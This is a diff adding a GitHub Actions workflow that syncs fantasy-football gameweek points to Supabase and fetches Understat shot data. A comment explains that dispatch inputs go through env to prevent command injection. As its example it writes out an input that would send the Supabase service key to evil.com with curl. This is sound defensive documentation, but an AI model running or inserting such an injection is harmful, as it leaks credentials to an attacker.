@@ -1,0 +1,84 @@
+name: Sync gameweek points
+
+# Core-Insights refreshes twice a day, at 07:30 and 17:30 UTC. These runs sit an
+# hour after each refresh so they always see the newest data rather than racing it.
+# 08:30 UTC = 18:30 Brisbane · 18:30 UTC = 04:30 Brisbane next day.
+on:
+  schedule:
+    - cron: '30 8 * * *'
+    - cron: '30 18 * * *'
+  workflow_dispatch:
+    inputs:
+      gw:
+        description: 'Gameweek or range to sync (e.g. 5 or 1-38). Blank = the most recent few.'
+        required: false
+        default: ''
+      full_resync:
+        description: 'Re-sync every gameweek of the season, not just the recent ones'
+        type: boolean
+        required: false
+        default: false
+
+concurrency:
+  group: sync-gameweek
+  cancel-in-progress: false
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+          cache: pip
+
+      - run: pip install -r requirements.txt
+
+      # Understat shot coordinates, for the inside/outside-the-box goal split.
+      # continue-on-error deliberately: this script has never been verified against a
+      # live Understat page, and a goal-location overlay is worth 2.2% of points. It
+      # must never be the reason a gameweek goes unscored.
+      # A stable key. Using ${{ github.run_id }} would never hit, so every run would
+      # restore via restore-keys and then write a brand-new full-season cache entry —
+      # ~60 new entries a month churning against the repo's 10 GB cache budget.
+      - name: Cache Understat shot data
+        uses: actions/cache@v4
+        with:
+          path: .understat_cache
+          key: understat-v1
+
+      - name: Fetch Understat shot coordinates
+        id: understat
+        continue-on-error: true
+        run: python3 fetch_understat_shots.py
+
+      # The dispatch inputs are passed through env, never interpolated into the script
+      # with ${{ }}. Template expansion happens before bash parses the line, so an
+      # input like  x"; curl -d "$SUPABASE_SERVICE_KEY" evil.com; #  would execute as
+      # shell on a step that has the service key in its environment.
+      - name: Sync gameweek points to Supabase
+        env:
+          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
+          GW: ${{ github.event.inputs.gw }}
+          FULL_RESYNC: ${{ github.event.inputs.full_resync }}
+        run: |
+          set -euo pipefail
+          if [ -n "${GW:-}" ]; then
+            python3 sync_gameweek.py --push --gw "$GW"
+          elif [ "${FULL_RESYNC:-}" = "true" ]; then
+            python3 sync_gameweek.py --push
+          else
+            python3 sync_gameweek.py --push --latest 3
+          fi
+
+      - name: Report Understat step failure
+        if: steps.understat.outcome == 'failure'
+        run: |
+          echo "::warning::Understat fetch failed — points were still synced, but every"
+          echo "::warning::goal scored at the inside-the-box rate (80 rather than 100 for"
+          echo "::warning::an outside-the-box goal). Worth ~2.2% of points. Check the"
+          echo "::warning::'Fetch Understat shot coordinates' step above for the reason."
